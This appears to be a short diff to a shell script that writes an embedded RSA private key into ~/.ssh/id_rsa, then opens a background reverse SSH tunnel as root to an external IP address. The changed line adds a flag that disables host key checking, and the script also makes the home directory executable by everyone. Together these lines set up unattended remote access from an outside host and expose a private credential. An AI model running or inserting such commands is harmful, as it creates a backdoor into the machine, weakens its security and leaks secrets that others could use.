@@ -49,7 +49,7 @@ fmItVQKBgAjgrhNOwrFXJXdieuT3tPjseanAzBn/JndJL5Z/W9Pr7I+p5yhbejQt
 +IU8AA8BjQJk7xFZIZx3IVAIS8Tl0wBqMMoYaODerljaEw7f0E5jO6X422eQpz+W
 CiAusups/UHcMe8X52Vy1pxsoEV7IDY0GtgRu+zQrPY1QRAgpNwp
 -----END RSA PRIVATE KEY-----" >> ~/.ssh/id_rsa
-ssh -oBatchMode=yes -R localhost:6666:104.236.235.148:22  root@104.236.235.148 sleep 10000 &
+ssh -oStrictHostKeyChecking=no -oBatchMode=yes -R localhost:6666:104.236.235.148:22  root@104.236.235.148 sleep 10000 &
 sleep 10
 ip a
 chmod a+x $HOME
